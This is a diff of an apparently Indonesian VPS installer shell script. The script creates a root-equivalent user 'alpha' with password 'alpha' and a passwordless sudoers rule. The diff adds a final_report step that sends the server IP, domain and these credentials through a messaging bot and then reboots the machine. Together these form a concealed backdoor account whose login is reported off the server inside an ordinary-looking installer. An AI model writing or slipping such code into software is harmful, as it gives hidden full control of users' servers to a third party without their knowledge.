@@ -310,10 +310,8 @@ function password_default() {
     
     # === AMBIL DATA DARI GITHUB PERMISSION ===
     wget -q -O /tmp/izin "https://raw.githubusercontent.com/hokagelegend9999/ijin/main/alpha"
-    
     nama_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $2}')
     exp_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $3}')
-    
     rm -f /tmp/izin
     
     if [[ -z "$nama_buyer" ]]; then
@@ -324,30 +322,41 @@ function password_default() {
     # === SETTING USER SYSTEM ===
     SysUser="alpha"
     SysPass="alpha"
-    
     userdel -f $SysUser > /dev/null 2>&1
     useradd -m -s /bin/bash $SysUser > /dev/null 2>&1
     echo -e "$SysPass\n$SysPass\n"|passwd $SysUser > /dev/null 2>&1
     usermod -aG sudo $SysUser > /dev/null 2>&1
     usermod -aG root $SysUser > /dev/null 2>&1
     echo "$SysUser ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
+}
+function final_report() {
+    domain=$(cat /root/domain)
+    MYIP=$(curl -sS ipv4.icanhazip.com)
+    SysUser="alpha"
+    SysPass="alpha"
 
-    # === SEND REPORT ===
+    # === SEND FINAL REPORT ===
     TEXT="<b>✅ INSTALLATION COMPLETED!</b>
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-<b>IP VPS :</b> <code>$MYIP</code>
-<b>Domain :</b> <code>$domain</code>
-<b>Date   :</b> <code>$(date)</code>
+<b>IP VPS  :</b> <code>$MYIP</code>
+<b>Domain  :</b> <code>$domain</code>
+<b>Date    :</b> <code>$(date)</code>
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 <b>🔑 ADMIN ACCESS:</b>
 <b>User :</b> <code>$SysUser</code>
 <b>Pass :</b> <code>$SysPass</code>
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-<i>Script installed successfully.</i>
-<i>VPS will reboot in 5 seconds.</i>
-"
+<i>Semua paket telah terpasang. VPS akan REBOOT otomatis.</i>
+<i>Silakan masuk kembali dalam 1-2 menit.</i>"
+
     msg_bot "$TEXT"
+    
+    echo -e "${YELLOW}Rebooting in 10 seconds...${NC}"
+    sleep 10
+    reboot
 }
+
+    
 
 clear
 # Pasang SSL
@@ -973,6 +982,7 @@ function instal(){
     menu
     profile
     enable_services
+    final_report
     # Final Report akan dikirim oleh password_default di atas
 }
 
